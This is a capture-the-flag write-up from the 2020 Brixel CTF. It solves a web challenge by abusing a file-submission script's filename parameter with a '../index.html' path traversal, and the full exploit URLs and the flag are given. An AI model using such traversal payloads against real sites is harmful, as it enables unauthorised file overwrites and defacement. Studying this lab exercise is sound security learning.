# 2020 Brixel CTF

Week long beginner friendly ctf taking place December 2020

## Overview


## Internet 15: Dadjokes

**Challenge**
Darn! Some idiot scriptkiddy broke my favorite website full of dad jokes!

I can't seem to contact the owner to fix the site

Can you bring it back and remove the defaced page?

**Solution**
The link takes you to a site that has clearly been defaced. Looking at the source, there's a comment that says:
```html
<!-- Hey bozo! I left your original index file under index_backup.html so you can see how your site looked before I used my l33t skillz to deface it. -->
```
Navigating to /index_backup.html we find that we can submit a new dad joke, or read a dad joke.  Looking at the submit feature, it looks like it includes information about the joke that you are submitting in the URI.
```
http://timesink.be/dadjokes/jokes/submit.php?filename=test.txt&title=test&content=test
```
I was most interested in that filename parameter.  Changing that to test.php and then trying to submit gets a clue from the creator:
```
You're on the right track, but I'm not going to allow this in here, try that somewhere else!
```
So we can't create a php file and get code execution, but maybe this is how the attackers defaced the main page? I thought to try to change the filename to index.html
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=test&submit=true
```
This results in a different hint from the creator:
```
You are definitely on the right track here... but what are you trying to accomplish?
```
Thinking back to the challenge, they wanted me to bring back the original dadjokes site. I thought that maybe I needed to include the source for the index_backup.html page. 
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=%3Chtml%3E%3Ctitle%3EDadJokes,%20your%20source%20of%20lame%20dad%20jokes%3C/title%3E%3Cbody%3E%3Cdiv%20align=%22center%22%3E%3Ch1%3EDadJokes%3C/h1%3E%3Chr%3E%3Cimg%20src=%22images/banner.png%22%20alt=%22dadjokes%22%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/read.php%22%3ERead%20dad%20jokes%3C/a%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/submit.php%22%3Esubmit%20your%20own%20jokes%3C/a%3E%3C/div%3E%3C/html%3E&submit=true
```
That worked! We are given the flag after submitting that payload.

**Flag**
```
brixelCTF{lamejoke}
```

## Internet 15: Pathfinders #1
